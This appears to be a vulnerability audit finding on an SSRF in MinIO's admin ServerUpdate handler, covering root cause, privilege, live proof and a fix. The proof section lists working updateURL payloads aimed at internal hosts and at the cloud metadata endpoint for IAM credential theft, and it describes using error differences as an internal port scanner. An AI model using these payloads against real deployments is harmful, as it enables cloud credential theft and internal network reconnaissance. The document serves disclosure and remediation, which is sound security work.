# F-06 — ServerUpdate SSRF with full response-body exfiltration (IMDS/internal-service read)

**Severity:** High (confirmed) / Critical (potential — cloud IMDS cred theft) · **Disposition:** CONFIRMED (live)
**Component:** admin-api-service-update-inspect · **CWE-918 SSRF + CWE-209 info-exposure-via-error**
**Target:** minio @ 7aac2a2c; reproduced on exact-HEAD (node A :19000)

## Root cause
`ServerUpdateHandler`/`ServerUpdateV2Handler` (cmd/admin-handlers.go) pass the attacker-supplied `updateURL`
query parameter straight to `downloadReleaseURL()` (cmd/update.go) which issues an HTTP GET via
`getUpdateTransport()`'s `NewInternodeDialContext` with **no scheme/host/IP allowlist for RFC1918 / link-local
(169.254.169.254) / internal ranges** (loopback IS blocked, but nothing else). When the fetched body is not the
expected `sha256 minio.RELEASE.<tag>` two-field format, `parseReleaseData()` embeds the **entire raw response
body** into `fmt.Errorf("Unknown release data \`%s\`", data)`, which propagates through `toAdminAPIErr` →
`getAPIErrorResponse` into the JSON `Message` field returned to the caller. Reflection requires the target to
answer HTTP 200 (which IMDS and most internal admin/health endpoints do).

## Attacker / privilege
A principal holding the scoped `admin:ServerUpdate` IAM action (`validateAdminReq(..., policy.ServerUpdateAdminAction)`
is the only gate — not full admin/root). Reachable under default config (`MINIO_UPDATE` not "off").

## Live proof (exact-HEAD node A, root credential used to drive the primitive)
```
updateURL=http://192.168.1.119:8899/creds  (mock internal service returning "SECRET-IMDS-CREDS-AKIAEXAMPLE-token-xyz")
  => HTTP 500  body: {"Code":"XMinioAdminUpdateUnexpectedFailure","Message":"Unknown release data `SECRET-IMDS-CREDS-AKIAEXAMPLE-token-xyz\n`", ...}
     -> full internal-service response body reflected to the caller (SSRF + exfiltration)
updateURL=http://169.254.169.254/latest/meta-data/  => 503 "dial tcp 169.254.169.254:80: i/o timeout"
     -> dial attempted (lab not on EC2); on a real EC2/GCE host this returns + reflects IMDS content
updateURL=http://127.0.0.1:8899/...  => 503 "connection refused"  -> loopback special-cased/blocked (only mitigation)
```
Oracle class: **disclosure/SSRF** — attacker-chosen internal URL fetched by the server, full body returned. The
error message also yields a per-host/port reachability oracle (refused vs timeout vs reflected) for internal
network scanning.

## Impact
Non-full-admin (or any admin) SSRF into the server's network namespace with response-body exfiltration. On cloud
deployments, `updateURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns the
node's IAM credentials, reflected to the caller → cloud account compromise (potential Critical). Also reads
internal-only management APIs, k8s services, and provides an internal port/host scanner.

## Fix
Validate `updateURL` against an allowlist (the official update host) or deny RFC1918/link-local/loopback and
non-official hosts before dialing; never reflect the fetched body into the client-facing error (`parseReleaseData`
should not embed raw remote content).

## Notes / confirmations
generator(Sonnet,raw) + judge(Sonnet,raw) confirmed; **live oracle: full body reflection from an internal
address**. Related vein: GHSA-gr9v (server-update path traversal) — this is the distinct SSRF+reflection angle.
(Round-2 verify pass wf_8bf5ba19 independently re-checking; cross-vendor codex queued.)
